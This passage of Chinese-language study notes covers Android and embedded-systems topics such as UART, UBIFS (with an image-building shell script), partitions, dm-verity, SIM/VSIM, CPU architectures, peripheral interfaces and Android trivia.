由于 CPU 与接口之间按并行方式传输，接口与外设之间按串行方式传输，因此，在串行接口中，必须要有 " 接收移位寄存器 " （串→并）和 " 发送移位寄存器 " （并→串）. 在数据输入过程中，数据 1 位 1 位地从外设进入接口的 " 接收移位寄存器 ",当 " 接收移位寄存器 " 中已接收完 1 个字符的各位后，数据就从 " 接收移位寄存器 " 进入 " 数据输入寄存器 " . CPU 从 " 数据输入寄存器 " 中读取接收到的字符.（并行读取，即 D7~D0 同时被读至累加器中）. " 接收移位寄存器 " 的移位速度由 " 接收时钟 " 确定.

UART
通用异步收发传输器（Universal Asynchronous Receiver/Transmitter，通常称为UART）是一种异步收发传输器，是电脑硬件的一部分，将数据通过串行通信和并行通信间作传输转换。UART通常用在与其他通信接口（如EIA RS-232）的连接上。

具体实物表现为独立的模组化芯片，或是微处理器中的内部周边装置(peripheral)。一般和RS-232C规格的，类似Maxim的MAX232之类的标准信号幅度变换芯片进行搭配，作为连接外部设备的接口。在UART上追加同步方式的序列信号变换电路的产品，被称为USART(Universal Synchronous Asynchronous Receiver Transmitter)。

https://juejin.im/post/5d3009375188251b4b32af17

串口工具下载
https://code.google.com/archive/p/android-serialport-api/downloads

参考资料
https://blog.csdn.net/gd6321374/article/details/74779770
```

## [知识点] F2FS

```text
F2FS (Flash Friendly File System) 是专门为基于 NAND 的存储设备设计的新型开源 flash 文件系统。特别针对NAND 闪存存储介质做了友好设计。F2FS 于2012年12月进入Linux 3.8 内核。F2FS仅支持Linux操作系统。

F2FS 选择 log-structured文件系统方案，并使之更加适应新的存储介质(NAND)。同时，修复了旧式日志结构文件系统的一些已知问题，如(1) wandering tree 的滚雪球效应和(2)高清理开销。
根据内部几何结构和闪存管理机制(FTL)，闪存存储设备有很多不同的属性，所以F2FS的设计者增加了多种参数，不仅用于配置磁盘布局，还可以选择分配和清理算法，优化性能(并行IO提高性能)。
```

## [知识点] UBIFS文件系统

```text
无序区块镜像文件系统(Unsorted Block Image File System, UBIFS)是用于固态存储设备上，并与LogFS相互竞争，作为JFFS2的后继文件系统之一。

制作ubifs文件系统
1,安装相关的软件包
sudo apt-get install liblzo2-dev

2,获取相关的工具mkfs.ubifs和ubinize
这两个工具是制作ubifs文件系统的时候用到，它们是mtd-utils工具包中的内容，mtd-utils工具包你可以从下面的网站下载和编译出来：
官方网站：http://www.linux-mtd.infradead.org/index.html
资源下载网站：http://git.infradead.org/

3,创建一个create-ubifs.sh脚本，主要是调用mkfs.ubifs和ubinize工具和相关参数来制作ubifs文件系统，内容如下：
#!/bin/bash

##########################################################
#      Script to generate ubifs filesystem image.        #
##########################################################

##### ubinize configuration file
config_file=rootfs_ubinize.cfg

##### Function to check result of the command
check_result() {
if [ $? -ne 0 ] 
then
    echo "FAILED"
else
    echo "SUCCESSFUL"
fi
}

######  Function to check whether an application exists
check_program() {
for cmd in "$@"
do
        which ${cmd} > /dev/null 2>&1
        if [ $? -ne 0 ] 
        then
                echo
                echo "Cannot find command \"${cmd}\""
                echo
                exit 1
        fi
done
}

if [ $# -ne 5 ] 
then
    echo
    echo 'Usage: create-ubifs.sh [page_size_in_bytes]  [pages_per_block]  [partition_size_in_bytes]  [blocks_per_device]  [path_to_rootfs] '
    echo
    exit
fi

page_size_in_bytes=$1
echo "Page size                                                 [$page_size_in_bytes] bytes."
pages_per_block=$2
echo "Pages per block                                           [$pages_per_block] "
partition_size_in_bytes=$3
echo "File-system partition size                                [$partition_size_in_bytes] bytes."
blocks_per_device=$4
echo "Blocks per device                                         [$blocks_per_device] "
path_to_rootfs=$5

# wear_level_reserved_blocks is 1% of total blcoks per device
wear_level_reserved_blocks=`expr $blocks_per_device / 100`
echo "Reserved blocks for wear level                            [$wear_level_reserved_blocks] "

#logical_erase_block_size is physical erase block size minus 2 pages for UBI
logical_pages_per_block=`expr $pages_per_block - 2`
logical_erase_block_size=`expr $page_size_in_bytes \* $logical_pages_per_block`
echo "Logical erase block size                                  [$logical_erase_block_size] bytes."

#Block size = page_size * pages_per_block
block_size=`expr $page_size_in_bytes \* $pages_per_block`
echo "Block size                                                [$block_size] bytes."

#physical blocks on a partition = partition size / block size
partition_physical_blocks=`expr $partition_size_in_bytes / $block_size`
echo "Physical blocks in a partition                            [$partition_physical_blocks] "

#Logical blocks on a partition = physical blocks on a partitiion - reserved for wear level
patition_logical_blocks=`expr $partition_physical_blocks - $wear_level_reserved_blocks`
echo "Logical blocks in a partition                             [$patition_logical_blocks] "

#File-system volume = Logical blocks in a partition * Logical erase block size
fs_vol_size=`expr $patition_logical_blocks \* $logical_erase_block_size`
echo "File-system volume                                        [$fs_vol_size] bytes."

echo
echo "Generating configuration file..."
echo "[rootfs-volume] "  > $config_file
echo "mode=ubi" >> $config_file
echo "image=rootfs_ubifs.img" >> $config_file
echo "vol_id=0" >> $config_file
echo "vol_size=$fs_vol_size" >> $config_file
echo "vol_type=dynamic" >> $config_file
echo "vol_name=system" >> $config_file
echo

# Note: Check necessary program for installation
#echo -n "Checking necessary program for installation......"
#check_program mkfs.ubifs ubinize
#echo "Done"

#Generate ubifs image
echo -n "Generating ubifs..."
./mkfs.ubifs -x lzo -m $page_size_in_bytes -e $logical_erase_block_size -c $patition_logical_blocks -o rootfs_ubifs.img -d $path_to_rootfs
check_result
echo -n "Generating ubi image out of the ubifs..."
./ubinize -o ubi.img -m $page_size_in_bytes -p $block_size -s $page_size_in_bytes $config_file -v
check_result

rm -f rootfs_ubifs.img
rm -f $config_file

(4)将mkfs.ubifs和ubinize以及create-ubifs.sh放置在同一目录下，然后调用create-ubifs.sh即可创建ubifs文件系统，create-ubifs.sh用法如下：
create-ubifs.sh  page_size_in_bytes(页大小) pages_per_block(每个扇区的页数量) partition_size_in_bytes(分区大小) blocks_per_device(扇区数量) path_to_rootfs(文件系统路径)
举例如下：
./create-ubifs.sh 2048 64 83886080 4096 ./rootfs
上面命令的意思是调用create-ubifs.sh将当前目录下的rootfs文件夹的内容制作成ubifs文件系统，nand flash的页大小为2k,每个扇区有64页，
总共有4096个扇区，要制作的文件系统的大小为83886080字节。
```

## [知识点] Fastboot

```text
fastboot协议是一种通过USB连接与bootloader通讯的机制。它被设计的非常容易实现，能够用于多种设备和运行Linux、Windows或者OSX的主机;
```

## [知识点] Log.wtf()

```text
Log.wtf()的意思不是 What The Fuck!，而是 What a Terrible Failure
```

## [知识点] BOM

```text
物料清单（Bill of Material, BOM），为物料清单，指产品所需要的零部件的清单及组成结构，即是生产一件产品所需的子零件及其产品中零件数量的完全组合。
```

## [知识点] MTK PA(power amplifier)

## [知识点] LK

```text
LK全称little Kernel,其主要功能为：
A.硬件初始化，包括建立vector table,MMU,cache,初始化peripherals,storage,USB,crypto等等;
B.加载boot.img；
C.支持烧写和进入recovery
```

## [知识点] MBR分区简介

```text
主引导记录（MBR，Main Boot Record）是位于磁盘最前边的一段引导（Loader）代码。它负责磁盘操作系统(DOS)对磁盘进行读写时分区合法性的判别、分区引导信息的定位，它由磁盘操作系统(DOS)在对硬盘进行初始化时产生的。
MBR 位于硬盘的 0 磁头、0 柱面、1 扇区，大小为 512 字节。它里面包含着操作系统里的分区信息。现在，我就简单介绍怎么从MBR作为入口点，获取系统的主分区、拓展分区以及逻辑分区。

编程实现对MBR数据读写
https://www.write-bug.com/article/1887.html
```

## [知识点] misc分区即"miscellaneous"(杂项)

```text
MISC（你基本可以认为他就是存储recovery命令的）。因为BootLoader启动会去读这个MISC分区中的内容，来决定自己进哪个系统。系统固件升级和恢复出厂都属于这种，就是recovery命令有点不一样。

https://blog.csdn.net/liyuchong2537631/article/details/102739235
```

## [知识点] pruduct分区

```text
许多 OEM 会自定义 AOSP 系统映像，以实现自己的功能并满足运营商的要求。不过，如果进行这类自定义，则无法针对多个软件 SKU 使用单个系统映像。映像必须各不相同，才能支持不同的语言区域、运营商等自定义。如果使用单独的 /product 分区来包含自定义项，则可以针对多个软件 SKU 使用单个系统映像。（/system 分区会托管可在众多软件 SKU 之间共享的通用代码）。/vendor 分区会继续托管 SoC 专属的板级 (BSP) 代码，这类代码可以基于指定 SoC 在多台设备之间共享。

使用单独的分区存在一些弊端，例如，难以管理磁盘空间（应该预留一定的空间满足未来增长的空间需求），以及难以在各分区之间维护稳定的应用二进制接口 (ABI)。在决定使用 /product 分区之前，请花些时间考虑一下您的 AOSP 实现的具体情况和可行的缓解策略（例如，在无线下载 (OTA) 更新期间对设备进行重新分区；此操作不是由 Google 来完成，而是由某些 OEM 来完成）。

/product 组件
/product 分区包含以下组件：

产品专用的系统属性 (/product/build.prop)
产品专用的 RRO (/product/overlay/*.apk)
产品专用的应用 (/product/app/*.apk)
产品专用的特权应用 (/product/priv-app/*.apk)
产品专用的内容库 (/product/lib/*)
产品专用的 Java 库 (/product/framework/*.jar)
产品专用的 Android 框架系统配置（/product/etc/sysconfig/* 和 /product/etc/permissions/*）
产品专用的媒体文件 (/product/media/audio/*)
产品专用的 bootanimation 文件
```

## [知识点] dm-verity

```text
从 4.4 版本开始,Android 结合 Kernel 的 dm-verity 驱动能力实现了一个名为“Verified Boot”的
安全特性,以期更好地保护系统本身免受恶意程序的侵害。我们在本小节将向大家讲解这一特性的基
本原理,以便读者们在无法成功利用 fastboot 写入 image 时可以清楚地知道隐藏在背后的真正原因。
dm-verity           Linux kernel 的一个驱动,用于在运行时态验证文件系统分区的完整性(判断依据是Hash Tree 和Signed metadata)
Boot State          保护等级,分为 GREEN、YELLOW、ORANGE 和 RED 四种
Device State        表明设备接受软件刷写的程度,通常有 LOCKED 和 UNLOCKED 两种状态
Keystore            公钥合集
OEM key Bootloader  用于验证 boot image 的 key
```

## [知识点] ABI (Application Binary Interface)

## [知识点] GSI

```text
What is Generic System Image (GSI)?
Android GSI is a full OS image that matches with AOSP source code. To application developers, GSI is a tool, similar to emulator, to enable developers to perform early application development and validation on future OS versions: if an application works on GSI then it should execute smoothly on future certified OEM platforms that have the same Android API level.
```

## [知识点] 单工、半双工、全双工的区别

```text
在网络的领域内，单工、半双工、全双工是经常会遇见的名称，下面简单的讲述一下他们的区别。
单工：简单的说就是一方只能发信息，另一方则只能收信息，通信是单向的。
半双工：比单工先进一点，就是双方都能发信息，但同一时间则只能一方发信息。
全双工：比半双工再先进一点，就是双方不仅都能发信息，而且能够同时发送。
```

## [知识点] GPIO

```text
General-purpose input/output，通用型之输入输出的简称，功能类似8051的P0—P3，其接脚可以供使用者由程控自由使用，PIN脚依现实考量可作为通用输入（GPI）或通用输出（GPO）或通用输入与输出（GPIO），如当clk generator, chip select等。
```

## [知识点] thermal 是什么意思??

```text
Linux Thermal 是 Linux 系统下温度控制相关的模块，主要用来控制系统运行过程中芯片产生的热量，使芯片温度和设备外壳温度维持在一个安全、舒适的范围。
```

## [知识点] 晶体谐振器/晶体振荡器 正确区分

```text
第一步：了解一下晶振。
晶体振荡器是指从一块石英晶体上按一定方位角切下薄片（简称为晶片），石英晶体谐振器，简称为石英晶体或晶体、晶振[1] ；而在封装内部添加LC组成振荡电路的晶体元件称为晶体振荡器。其产品一般用金属外壳封装，也有用玻璃壳、陶瓷或塑料封装的。
石英晶振  就是用石英材料做成的石英晶体谐振器,起产生频率的作用,具有稳定,抗干扰性能良好。
广泛应用于各种电子产品中.
石英晶振 是晶振中的一种，晶振正确的分类方法是 石英晶振 和 陶瓷晶振，不难看出石英和陶瓷皆是对晶振材质的称呼。
石英晶振 是一种用于稳定频率和选择频率的电子元件，已被广泛地使用在无线电话、载波通讯、广播电视、卫星通讯、数字仪表、钟表等各种电子设备中。
本文介绍了有关石英晶体谐振器和振荡器的基础知识，并正确指出了有关于晶体谐振器和晶体振荡器的不同点和相同点。

第二步：看  晶体谐振器   晶体振荡器    区别。
石英晶体谐振器是一种无源晶体，石英晶体振荡器角度来说是有源晶振。
无源晶体和有源晶振的区别就在于，前者无电压范围，后者有电压；
再而一个区别就在于后者的价格往往要高于前者价格的几倍。
两个名次术语如同双胞胎，仅一字之差。而正是这一字之差使得两者的属性参数在电路板中都有着决然不同的角色。
如何正确区分石英晶体谐振器和石英晶体振荡器了。
简而言之即是晶体谐振器和晶体振荡器的差别在哪里。毕竟石英只是他们的材质，我们可以忽略不计。

两者共同点
1，晶体谐振器和晶体振荡器都有贴片封装和插件封装。
2，晶体谐振器和晶体振荡器使用范围都一致。通信，无线，GPS随处可见他们的身影。

两者不同点
1，晶体振荡器价格往往要比晶体谐振器价格高。
2，晶体振荡器参数有电压单位，晶体谐振器参数不会有电压单位。
3，晶体振荡器脚位均是4脚以上包括4脚，晶体谐振器通常是2脚或者4脚，不会存在4脚以上的晶体谐振器。
4，晶体振荡器的高度往往要高于晶体谐振器。
5，晶体振荡器不会有陶瓷材质，因为陶瓷材质相比石英材质，没有足够的稳定性，且在精度上也远远不及石英材质。晶体谐振器有石英材质和陶瓷材质，我们俗称的陶瓷谐振器就是晶体谐振器中的一种。陶瓷谐振器中稳定性和口碑极好的品牌有村田晶振。
6，晶体振荡器和晶体谐振器工作性质不一致，晶体振荡器无需借助外部元器件起振，自身就可以起振，因为晶体振荡器内部有起振芯片。晶体谐振器需要借助外部元器件来起振。
有关晶体谐振器和晶体振荡器，仅一字之差。而对于有时候粗心大意的你，你是否会认为晶体振荡器就是晶振的统称了。而聪明的采购早已能分辨出晶体和晶振并非两个属性相同的元器件。看来做为一名采购暗地里也是下了不少功夫。
```

## [知识点] 屏幕

```text
TP = Touch Panel=触控面板

LCD = Liquid Crystal Display=液晶显示器

LED : 发光二极管（英语：light-emitting diode，缩写为LED）是能发光的半导体电子器件，透过三价与五价元素所组成复合光源。此种电子器件早在1962年出现，早期只能够发出低光度的红光，被惠普买下专利后当作指示灯利用。及后发展出其他单色光的版本，时至今日，能够发出的光已经遍及可见光、红外线及紫外线，光度亦提高到相当高的程度。随着白光发光二极管的出现，用途已由初期的指示灯及显示板等指示用途，逐渐发展至近年的照明用途。
LED Display(LED 显示屏)

OLED
有机发光二极管（OrganicLight-Emitting Diode，OLED），又称为有机电激光显示、有机发光半导体（OrganicElectroluminescence Display，OLED），是指有机半导体材料和发光材料在电场驱动下，通过载流子注入和复合导致发光的现象。 [2]  
一般而言，OLED可按发光材料分为两种：小分子OLED和高分子OLED（也可称为PLED）。 [2]  
OLED是一种利用多层有机薄膜结构产生电致发光的器件，它很容易制作，而且只需要低的驱动电压，这些主要的特征使得OLED在满足平面显示器的应用上显得非常突出。OLED显示屏比LCD更轻薄、亮度高、功耗低、响应快、清晰度高、柔性好、发光效率高，能满足消费者对显示技术的新需求。全球越来越多的显示器厂家纷纷投入研发，大大的推动了OLED的产业化进程。 [3]  

AMOLED
Active-matrix organic light-emitting diode，中译：主动矩阵有机发光二极管

IPS硬屏

Rotena
```

## [知识点] android 各类缩写记录

```text
IPO(Instant power on)快速开机
一个是输入模块，一个是显示模块。
目前的智能机，两个功能都需要

手机的AP和BP：
AP: Application Processor，即应用芯片 BP：BasebandProcessor，即基带芯片 根据上下文可以指代软件和硬件两种意思。大多数的手机都含有两个处理器。操作系统、用户界面和应用程序都在Application Processor(AP)上执行，AP一般采用ARM架构的CPU。

BP: Baseband Processor 手机射频通讯控制软件，则运行在另一个分开的CPU上，这个CPU称为Baseband Processor(BP)。 
AP上面则运行了我们通常的操作系统和应用软件，如Android、Windows phone 7这些。而我们通常所说的双核、四核就是指的其AP核的多少。因此可以这样理解，AP可以算作是你的电脑，BP则是电脑的modem（调制解调器），没有modem（调制解调器），你没有办法和外界通信

LK是什么，LK 是 Little Kernel 它是 appsbl （Applications ARM Boot Loader）流程代码  ，little kernel 是小内核小操作系统。
主要用来引导运行OS系统，lk启动后根据一些参数值，引导启动进入不同模式。其实Android手机有四种启动方式，四种方式分别为：
正常开机启动,
recovery启动,
fastboot启动,
ffbm启动

LK 代码 在 bootable/bootloadler/lk 目录下
LK 代码结构
+app            // 应用相关
+arch           // arm 体系 
+dev            // 设备相关
+include        // 头文件
+kernel         // lk系统相关   
+platform       // 相关驱动
+projiect       // makefile文件
+scripts        // Jtag 脚本
+target         // 具体板子相关
https://www.cnblogs.com/xiaolei-kaiyuan/p/5458145.html

HAL（Hardware Abstraction Layer），硬件抽象层。
由于部分硬件厂商不想把自己的核心代码公开，如果把代码放在内核空间里就需要遵循GUN License，会损害厂家的利益。所以，Google为了响应厂家在Android的架构里提出HAL的概念，把对硬件的支持分为用户空间和内核空间，而HAL层就属于这里面的用户空间，该部分代码遵循Apache License，所以厂家可以把核心的代码实现在HAL层，无需对外开放源代码。

HAL层的新旧架构
上层通过jni直接调用so库，在so库中实现底层驱动的操作（Module）
上层查找已经注册的Stub，返回硬件对象的操作接口，后续直接通过接口操作硬件（ModuleStub）


CDS: Correlated Double Sampling
CCI: Camera Control Interface
OTP: one-timing programming
CIS: CMOS image sensor
DVFS:dynamic voltage and frequency scaling
TLP: thread level parallelism
DCM: dynamic clock management
AFE: Audio Front-End 音频前后端
HS:  handset
AOSP:Android Open-Source Project
Turnkey project: 一站式方案
ISP: Image Signal Processing
ALS: ambient light sensing
PD:  Proximity Detection
WBT: Wifi & Bluetooth
HPL: headphone L
HPR: headphone R
Amp: PA
ALSPS: ambient light sensing & proximity sensing
META: Mobile Engineering Testing Architecture
SELinux: Security-Enhanced Linux
DAC: Discretionary Access control
MAC: Mandatory Access control
STP: Serial Transport Protocal
AF:  auto focus
AAL: Ambient-light Adaptive Luma
ACDK: Android Camera Debug Kit
AEE: Android Exception Engine
SDK: Software Develop Kit
CSP: CPU Support Package
BSP: Board Support Package
KMA: Kernel Memory Allocator
MNL: Mediatek Navigating Library
WMT: wireless manager task
HIF: Host Interface
AEE：Android Exception Engine
EMI：External Memory Interface
GFP: Get Free pages
LTF: Linux Thermal Framework
BTS: board thermal sensor
ATM: Adaptive Thermal Management
TP: Thermal Protection
JNI: Java Native Interface
```

## [知识点] 磁力链接

```text
磁力链接（Magnet URI scheme），是对等网络中进行信息检索和下载文档的电脑程序。和基于“位置”连接的统一资源定位符（URL）不同，磁力链接是基于元数据（metadata）文件内容，属于统一资源名称（URN）。也就是说，磁力链接不基于文档的IP地址或定位符，而是在分布式数据库中，通过散列函数值来识别、搜索来下载文档。因为不依赖一个处于启动状态的主机来下载文档，所以特别适用没有中心服务器的对等网络。举例来说，一个常见的磁力链接形式为“magnet:?xt=urn:btih:”。
```

## [知识点] VSIM相关知识

```text
Q: 什么是VSIM?
A: VSIM（Virtual SIM）是用软件的方式实现一张实体卡的功能，使终端用户只通过软件操作就可以使用Data等功能。
 
Q: VSIM的分类.
A: VSIM可分为Soft SIM和Remote SIM，Soft SIM在手机local存储所有的SIM信息（包括Authentication key），SIM的鉴权在local完成。Remote SIM的Authentication key等信息存在Server端，鉴权时由手机通过另一张SIM卡把鉴权请求发到Server端，Server把鉴权结果返回给手机。
 
Q: MTK VSIM方案有哪些?
A: MTK VSIM分为VSIM1.0、VSIM2.0和VSIM3.0三个世代：
VSIM1.0支持Soft SIM和在DSDA平台上支持Remote SIM
VSIM2.0只支持Soft SIM，支持VSIM不占实体卡槽, 因TSTS平台不支持TD-SCDMA和C2K，所以只有4模以下Project可开TSTS版本。
VSIM3.0支持Soft SIM和在DSDS/TSTS平台上支持Remote SIM, 因为它需要MULTIPLE_PS, 而MULTIPLE_PS不支持TD-SCDMA和C2K，所以VSIM3.0只能开在4模及以下Project.

1. APDU 是否使用一个通用的接口来实现??

2.3.8. 响应 APDU 请求
实现 APDU 指令的接收、解析、响应。其中 APDU 指令接收的具体实现交互/数据接口
见《VSIM API Usage Introduction》第 21 页

APDU= ApplicationProtocol data unit, 是智能卡与智能卡读卡器之间传送的信息单元, （给智能卡发送的命令）指令（ISO 7816-4规范有定义）

SIM卡中保存的信息
在SIM卡上，存储了我们手机用户的信息。那么，究竟是哪些信息呢?如下：
1、由SIM卡生产厂商存入的系统原始数据。
2、由移动运营商在将卡发放给用户时注入的网络参数和用户数据。包括鉴权和加密信息、算法、参数。
3、由用户自己存入的数据。比如，短消息、通讯录、话费记数等。
4、用户在用卡过程中自动存入和更新的网络接续和用户信息类数据。包括最近一次位置登记时的位置信息，临时移动用户号（TMSI）等。
这些数据信息中，第1类是写死无法修改的，第2类是只有专业部门才能查阅和更新的，第3、4类才是手机可以读写更新的。

eSIM是指Embedded-SIM（嵌入式SIM卡），本质上还是一张SIM卡，只不过它变成了一颗SON-8的封装IC，直接嵌入到电路板上。

如果说eSIM至少还算是一个硬件，那么，softSIM和vSIM干脆一不做二不休，彻底消灭了硬件。

例如SoftSIM，依托操作系统软件实现SIM功能，没有实际的物理芯片存在，对基带进行修改后，基带重定向直接通过其它接口和操作系统层交互，而不再需要访问SIM硬件。（这应该是虚拟SIM的终极形态吧！）

https://mlog.club/article/508654

UICC（Universal Integrated Circuit Card）通用集成电路卡
UICC卡是一种可移动智能卡，它用于存储用户信息、鉴权密钥、电话簿、短消息等信息。
https://blog.csdn.net/u010961631/article/details/38234903

我们手机中使用的SIM卡分为SIM/USIM等，这些卡的种类不同，功能有别，但是统称为UICC（Universal Integrated Circuit Card），而且无论什么类型的SIM卡，其最基本的功能是相同的，比如都要有唯一的ID（ICCID），都要具备运营商标识（MCC/MNC），都要有存储数据的能力（保存通讯录）等，Android构建了一套系统抽象的管理所有的SIM卡，其主要组成部分如下：
1、UiccController.java
----Uicc的总控制接口，向外提供UiccCard、UiccCardApplication、IccRecords、IccFileHandler对象
2、UiccCard.java
----向外提供UiccCardApplication对象，并完成CatService的初始化
3、UiccCardApplication.java
----创建并向外提供IccFileHandler、IccRecords对象
4、IccFileHandler.java
----负责SIM卡文件系统的读写
5、IccRecords.java
----保存SIM卡常用信息，包括SIM联系人、语音信箱等
6、CatService.java
----负责STK业务

SIM中包括下列信息：
◆国际移动用户标识（IMSI，International Mobile Subscriber Identity）：用户身份标识，用于接入鉴权。
◆移动用户ISDN号码（MSISDN，Mobile Subscriber ISDN Number）：移动用户的手机号码。
◆密钥Ki、加密算法A3、A8：用于鉴权。
◆移动国家码（MCC，Mobile Country Code）、归属PLMN的移动网络码（MNC，Mobile Network Code）：网络标识。

SIM: GSM
UIM: CDMAone
USIM: UMTS and GSM
RUIM: support GSM, CDMAone, CDMA2000
UICC: all supported, including SIM, USIM, CSIM(a port of R-UIM functionality to the UICC).

LTE既可以用USIM卡也可以用RUIM卡。

PIN码是指USIM卡的密码，存在于USIM卡中，其出厂值为1234或0000。激活PIN码后，每次开机要输入PIN码才能登录网络。PUK码是用来解PIN码的万能钥匙，共8位。用户是不知道PUK码的，只有到营业厅由工作人员操作。当PIN码输错3次后，USIM卡会自动上锁，此时只有通过输入PUK才能解锁。PUK码共有10次输入机会。所以此时，用户千万不要自行去碰PUK密码,输错10次后，USIM卡会自动启动自毁程序，使USIM卡失效。此时，只有重新到营业厅换卡。其实，只要小心使用，PIN密码只会保护你的安全。
从卡的外型上来说，卡一般有普通型，Mini型，Micro型，还有苹果的Nano型，尺寸越来越小。
从卡的使用领域上来说，有普通领域，如手机，数据卡，还有工业级嵌入式领域。
从卡是否可插拔上来说，分为可插拔和不可插拔卡，一般来说，工业级嵌入式领域用的卡不可插拔，其他的，一般均可插拔。
```

## [知识点] CPU架构

```text
TARGET_ARCH_VARIANT在源码中有多个值，比如armv7-a-neon/x86_64/mips64r6。这些分别代表什么含义呢?

arm系列(Advanced RISC Machines)自己不制造芯片，只将芯片的设计方案授权给其他公司，由它们来生产，该优势就是：功耗
以armv7-a-neon来举例说明，arm打头代表CPU架构是arm的，v7表示版本，v7以及v7以下的版本均是32位的，从v8开始就是64位了。而v7版本的arm又细分为三种：

a:专为Application设计，a代表Applications
r:专为实时系统设计，r代表Real-time
m:精简版本,m代表Microcontroller
这其中a跟r非常类似。我们平时见的多是armv7-a系列。

提下neon, 它是arm公司专为移动消费类设备设计的。它提供了更卓越的视频编码解码，3D图形渲染，语音处理，流媒体处理等功能。

还有vfp，vfp是Vector Floating-Point的缩写，它在处理矢量浮点运算方面表现更好。

明白了这些在看下面这些配置值心里就明白意思了。

armv7-a-neon
armv5te-vfp
armv8-a
mips系列
mips是区别与arm的另一种CPU架构。由MIPS公司开发并授权，它跟arm一样都基于精简指令集处理器架构的思想，常见的有

mips64r6
mips32r2-fp
mips32-fp
x86系列
x86_64中x86表示cpu架构是由因特尔公司开发，而64表示是64位系统。
```

## [知识点] 常见的外设接口

```text
物联网设备的外设虽然五花八门，但是外设和主控芯片（CPU）的接口类型，通常就是那么几种：

UART：就是我们常说的“串口”，主要用来用作通讯。很多物联网常用外设，比如GPS模组、蓝牙模组、2G/4G模组等等，都支持使用UART来和主控芯片通讯。
GPIO：通常叫做“通用IO接口”，这里的IO（或说I/O）是指输入/输出。GPIO的操作非常简单，就是高低电平的输入或者输出，比如点亮一个LED灯，或者从一个开关按钮读取按下状态等等。
SPI：串行外设接口，比起UART，SPI接口能支持很高的数据吞吐率，比如网络控制器、FLASH存储器这些需要高速和CPU交换数据的外设，通常是使用SPI接口的。不过SPI是分主从设备的，数据交换是由主SPI设备发起的从SPI听命于主设备的控制。
IIC：是Inter-Integrated Circuit Bus的简称，通常翻译成“集成电路总线”。IIC的特点是需要的连线少，控制逻辑简单易实现，也适用于一主多从的总线式外设连接布局。实际使用中，很多种类型的传感器产品都支持IIC接口，比如温度传感器、加速度传感器等等。
PWM：Pulse Width Modulation，即“脉冲宽度调制器”，或者不那么准确但是简单地理解为“脉冲波发生器”。在机械控制中用的最多，比如步进电机。也可以用来控制简单的喇叭发声。
ADC/DAC：即“模数/数模转换器”。像电压这样的模拟量，计算机需要将其数字化才能够处理，这就是“模-数”转换。反之则是“数-模”转换。
IIS：Integrate Interfce of Sound。从名字就可以看出来，这个接口是接声音输入输出设备的。一般的音频采集芯片、音频编解码芯片或是音频播放芯片都支持IIS接口。

Java对外设接口的支持
Java在外设控制这方面，以前并没有专门的接口。从OpenJDK 7开始，OpenJDK加入了DeviceIO作为外设控制的标准接口，对物联网设备常见的外设接口做了标准化支持。
JOSH针对小型物联网设备，对DeviceIO进行了小幅改动。通过JOSH DeviceIO API（org.joshvm.j2me.dio.*)，目前支持的接口类型有UART、GPIO、SPI和IIC，Java程序员可以实现用Java语言控制外设，比如控制电平开关、读取传感器数据等等。换言之，可以实现用Java语言编写物联网设备的外设驱动程序，并实现驱动程序的动态安装。
下面，我们通过一些示例，看看是如何通过JOSH DeviceIO API实现外设访问功能的。
```

## [知识点] 运行时注解 vs 编译时注解

```text
一般有些人提到注解，普遍就会觉得性能低下。但是真正使用注解的开源框架却很多例如ButterKnife，Retrofit等等。所以注解是好是坏呢?
首先，并不是注解就等于性能差。更确切的说是运行时注解这种方式，由于它的原理是java反射机制，所以的确会造成较为严重的性能问题。
但是像Butterknife这个框架，它使用的技术是编译时注解，它不会影响app实际运行的性能（影响的应该是编译时的效率）。
一句话总结：

运行时注解就是在应用运行的过程中，动态地获取相关类，方法，参数等信息，由于使用java反射机制，性能会有问题；
编译时注解由于是在代码编译过程中对注解进行处理，通过注解获取相关类，方法，参数等信息，然后在项目中生成代码，运行时调用，其实和直接运行手写代码没有任何区别，也就没有性能问题了。
这样我们就解决了第一个问题。
```

## [知识点] 检查型异常和非检查型异常的区别

```text
究竟什么是检查型异常和非检查型异常，它们的联系和区别是什么呢。首先通过文字来描述一下：
检查型异常：Exception是检查型异常，在程序中必须使用try…catch进行处理，如果不不捕获该异常会导致程序编译不通过；
非检查型异常：RuntimeException是非检查型异常，例如NumberFormatException，可以不使用try…catch进行处理，但是如果产生异常，则异常将由JVM进行处理。
```

## [知识点] FRP(Factory Reset Protection)

```text
Android devices include the Factory Reset Protection (FRP) security feature. When a Google account is set up on a device, the account credentials are required to unlock the device after it was reset to its factory settings.

Devices enrolled with Sophos Mobile in Android enterprise device owner mode are not secured by FRP by default because there is no Google account set up on the device. To use FRP for these devices, configure one or more Google accounts to be assigned to all of your devices. When a device is reset with FRP turned on, it can only be unlocked by one of these accounts. See Configure Android Factory Reset Protection.

When you have configured FRP, devices are protected as follows:

Local reset: When the device is reset in the Settings app or by using the device hardware buttons, FRP is turned on by default. To change this behavior for individual devices, use the Set Factory Reset Protection device action. See Turn Android Factory Reset Protection on or off.

Remote reset: When the device is reset remotely in Sophos Mobile Admin, FRP is turned off by default. To perform a remote reset with FRP turned on, select Turn on Factory Reset Protection in the wipe confirmation dialog. See Wipe device.
```

## [知识点] android冷门知识点

```text
四大组件相关：
1.启动一个Activity，在应用进程至少需要两个Binder线程。
2.启动一个launchMode为singleTask的Activity，它并不一定会运行在新的Activity栈中。
3.两个不同应用的Activity，可以运行在同一个Activity栈中。
4.同一个应用进程中的所有Activity，共享一个WindowSession。
6.可以通过设置Activity主题android.R.style.Theme_NoDisplay，来启动一个不显示的Activity，在某些需要过渡的地方很实用。
7.Activity、Service、Receiver在没有配置intent-filter的action属性时，exported默认为false，配置了intent-filter的action属性时，exported默认为true。稍有不慎，很可能埋下越权、Intent攻击等安全隐患。
8.当从最近使用应用列表中移除某个App时，四大组件只有Service拥有神奇的onTaskRemoved回调，但是并不一定回调，还与stopWithTask属性等有关。
9.四大组件都运行在主线程，是因为它们在ActityThread中（或Instrumentation）实例化；它们的生命周期也运行在主线程，是因为通过ActivityThread.H将消息从Binder线程发送到主线程，然后执行回调。
10.TaskStackBuilder的出现基本上解决了所有构造Activity回退栈的问题。
11.ContentProvider的onCreate()方法先于Application的onCreate()方法执行，晚于Application的attachBaseContext()方法，所以在ContentProvider的onCreate()时候也是有办法弹出一个AlertDialog的（参考5）。
12.BroadCastReceiver回调onReceive(Context context,Intent intent)中的context类型各种场景相差很大，静态注册的receiver回调的Context都是ReceiverRestrictedContext，动态注册的receiver有可能是Activity或Application。
13.ServiceRecord和BroadcastRecord自身就是Binder。
14.同一个provider组件名，可能对应多个provider。

Handler、Message相关：
